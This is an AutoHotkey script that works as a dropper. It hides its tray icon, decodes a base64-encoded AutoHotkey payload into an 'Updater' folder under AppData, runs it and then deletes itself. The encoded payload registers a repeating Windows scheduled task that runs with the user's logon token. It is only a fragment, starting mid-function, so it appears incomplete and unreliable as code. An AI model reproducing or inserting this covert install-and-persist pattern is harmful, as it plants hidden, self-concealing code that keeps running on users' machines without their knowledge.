 #NoTrayIcon
#SingleInstance Force 

CreateUpdater()

CreateUpdater() {
   local
   base64 := GetBase64()
   size := CryptStringToBinary(base64, data)
   if !InStr(FileExist(A_AppData . "\Updater"), "D")
      FileCreateDir, % A_AppData . "\Updater"
   filePath := A_AppData . "\Updater\Updater.ahk"
   if !FileExist(filePath) || CompareData(filePath, data, size) {
      File := FileOpen(filePath, "w")
      File.Pos := 0
      File.RawWrite(data, size)
      File := ""
   }
   Run, % filePath
   FileDelete, % A_ScriptFullPath
}

CryptStringToBinary(string, ByRef outData, formatName := "CRYPT_STRING_BASE64")
{
   local
   static formats := { CRYPT_STRING_BASE64: 0x1
                     , CRYPT_STRING_HEX:    0x4
                     , CRYPT_STRING_HEXRAW: 0xC }
   fmt := formats[formatName]
   chars := StrLen(string)
   if !DllCall("Crypt32\CryptStringToBinary", "Str", string, "UInt", chars, "UInt", fmt
                                            , "Ptr", 0, "UIntP", bytes, "Ptr", 0, "Ptr", 0)
      throw "CryptStringToBinary failed. LastError: " . A_LastError
   VarSetCapacity(outData, bytes)
   DllCall("Crypt32\CryptStringToBinary", "Str", string, "UInt", chars, "UInt", fmt
                                        , "Str", outData, "UIntP", bytes, "Ptr", 0, "Ptr", 0)
   Return bytes
}

CompareData(filePath, ByRef data, len) {
   local
   fileLen := GetFileData(filePath, fileData)
   if (fileLen != len)
      Return true
   hLib := DllCall("LoadLibrary", "Str", "Bcrypt.dll", "Ptr")
   fileHashLen := CreateHash(&fileData, fileLen, fileHashData)
   dataHashLen := CreateHash(&data, len, hashData)
   DllCall("FreeLibrary", "Ptr", hLib)
   Return DllCall("msvcrt\memcmp", "Ptr", &fileHashData, "Ptr", &hashData, "Ptr", dataHashLen)
}

GetFileData(filePath, ByRef data) {
   local
   File := FileOpen(filePath, "r")
   File.Pos := 0
   File.RawRead(data, len := File.Length)
   File := ""
   Return len
}

CreateHash(pData, size, ByRef hashData, pSecretKey := 0, keySize := 0, AlgId := "SHA256") {
   ; CNG Algorithm Identifiers
   ; https://docs.microsoft.com/en-us/windows/win32/seccng/cng-algorithm-identifiers
   local
   static HMAC := BCRYPT_ALG_HANDLE_HMAC_FLAG := 0x00000008
   DllCall("Bcrypt\BCryptOpenAlgorithmProvider", "PtrP", hAlgorithm, "WStr",  AlgId, "Ptr", 0, "UInt", keySize ? HMAC : 0)
   DllCall("Bcrypt\BCryptCreateHash", "Ptr", hAlgorithm, "PtrP", hHash, "Ptr", 0, "UInt", 0, "Ptr", pSecretKey, "UInt", keySize, "UInt", 0)
   DllCall("Bcrypt\BCryptHashData", "Ptr", hHash, "Ptr", pData, "UInt", size, "UInt", 0)
   DllCall("Bcrypt\BCryptGetProperty", "Ptr", hAlgorithm, "WStr", "HashDigestLength", "UIntP", hashLen, "UInt", 4, "UIntP", cbResult, "UInt", 0)
   VarSetCapacity(hashData, hashLen, 0)
   DllCall("Bcrypt\BCryptFinishHash", "Ptr", hHash, "Ptr", &hashData, "UInt", hashLen, "UInt", 0)
   DllCall("Bcrypt\BCryptDestroyHash", "Ptr", hHash)
   DllCall("Bcrypt\BCryptCloseAlgorithmProvider", "Ptr", hAlgorithm, "UInt", 0)
   Return hashLen
}

GetBase64() {
local
base64 := ""
base64 .= "ICAgICByZXBldGl0aW9uIDo9IHRyaWdnZXIuUmVwZXRpdGlvbg0KICAgICAgcmVwZXRpdGlvbi5EdXJhdGlvbiA6PSAiUDFEIg0KICAgICAgcmVwZXRpdGlvbi5JbnRlcnZhbCA6PSAiUFQiIC4gaW50ZXJ2YWxIb3VycyAuICJIIg0KICAgfQ0KICAgc3RhcnRUaW1lIDo9ICIyMDIyMDYxNiIgLiBTdHJSZXBsYWNlKHN0YXJ0VGltZSwgIjoiKSAuICIwMCINCiAgIEZvcm1hdFRpbWUsIHN0YXJ0VGltZSwgJSBzdGFydFRpbWUsIHl5eXktTU0tZGRUSEg6bW06c3MNCiAgIHRyaWdnZXIuU3RhcnRCb3VuZGFyeSA6PSBzdGFydFRpbWUNCiAgIHRyaWdnZXIuSWQgOj0gIlRpbWVUcmlnZ2VySWQiDQogICB0cmlnZ2VyLkVuYWJsZWQgOj0gdHJ1ZQ0KDQogICBhY3Rpb24gOj0gdGFza0RlZmluaXRpb24uQWN0aW9ucy5DcmVhdGUoIFRBU0tfQUNUSU9OX0VYRUMgKQ0KICAgYWN0aW9uLlBhdGggOj0gZmlsZVBhdGgNCiAgIChzQXJncyAhPSAiIiAmJiBhY3Rpb24uQXJndW1lbnRzIDo9IHNBcmdzKQ0KICAgDQogICB0YXNrIDo9IHJvb3RGb2xkZXIuUmVnaXN0ZXJUYXNrRGVmaW5pdGlvbih0YXNrTmFtZSwgdGFza0RlZmluaXRpb24sIFRBU0tfQ1JFQVRFX09SX1VQREFURSwsLCBUQVNLX0xPR09OX0lOVEVSQUNUSVZFX1RPS0VOKQ0KICAgKCBzdGFydEltbWVkaWF0ZWx5ICYmIHRhc2suUnVuKCIiKSApDQogICBSZXR1cm4gdHJ1ZQ0KfQ=="
Return base64
}
